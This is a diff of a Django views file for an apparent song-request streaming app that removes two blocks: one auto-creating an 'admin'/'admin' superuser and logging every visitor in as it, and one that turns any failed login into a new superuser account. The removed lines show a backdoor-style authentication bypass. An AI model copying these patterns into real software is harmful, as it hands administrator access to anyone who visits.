@@ -134,13 +134,6 @@ def get_song_requests(request):
 # Create your views here.
 @ensure_csrf_cookie
 def index(request):
-    if not User.objects.filter(username="admin").exists():
-        su = User.objects.create(username="admin", email="admin@example.com", is_superuser=True, is_staff=True, password="admin")
-        su.save()
-
-    user = authenticate(request, username="admin", password="admin")
-    login(request, user)
-
     return render(request, 'stream/index.html')
 
 
@@ -177,14 +170,6 @@ def login_view(request):
                 messages.success(request, f"Welcome {username}!")
                 return HttpResponseRedirect(reverse("index"))
             else:
-                user = User.objects.create_user(username=username, password=password, email="admin@example.com")
-                user.is_staff = True
-                user.is_superuser = True
-                user.save()
-
-                user = authenticate(request, username=username, password=password)
-                login(request, user)
-
                 messages.error(request, "Invalid Credentials!", extra_tags="danger")
                 return HttpResponseRedirect(reverse("login"))
 
